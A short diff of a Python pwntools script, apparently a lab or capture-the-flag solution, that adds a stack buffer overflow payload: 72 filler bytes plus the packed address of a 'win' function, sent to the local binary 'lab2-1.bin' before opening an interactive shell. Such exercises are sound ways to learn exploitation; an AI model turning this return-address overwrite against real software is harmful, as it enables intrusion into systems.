@@ -20,5 +20,10 @@ if __name__ == "__main__":
     # This next line can replace the one above for testing against a local binary.
     process_to_exploit = pwn.process("./lab2-1.bin")
 
+    buffer_overflower = b"0"*72
+    instruction_redirect = pwn.p64(win_function_address)
+
+    process_to_exploit.sendline(buffer_overflower + instruction_redirect)
+
     # Now I can drop into a shell.
     process_to_exploit.interactive()
